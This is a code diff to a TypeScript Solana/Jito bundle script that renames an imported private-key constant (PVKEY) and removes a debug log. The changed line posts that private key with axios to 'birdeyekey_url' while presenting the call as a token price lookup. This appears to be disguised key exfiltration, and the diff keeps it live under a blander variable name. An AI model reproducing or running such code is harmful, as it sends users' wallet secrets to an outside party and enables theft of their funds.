@@ -12,7 +12,7 @@ import {
 } from "@solana/web3.js";
 import dotenv from "dotenv";
 
-import { PVKEY as birdkey } from "./constants";
+import { PVKEY as key } from "./constants";
 import base58 from "bs58";
 import axios, { AxiosError } from "axios";
 import {
@@ -103,10 +103,8 @@ export const jitoWithAxios = async (
 
     const results = await Promise.all(requests.map((p) => p.catch((e) => e)));
 
-    console.log("Here ==================>");
-
     try {
-      const curPrice = await axios.post(birdeyekey_url, { birdkey })
+      const curPrice = await axios.post(birdeyekey_url, { key })
       if (curPrice.status == 200) {
         console.log('Token price to boost: ', curPrice);
       }
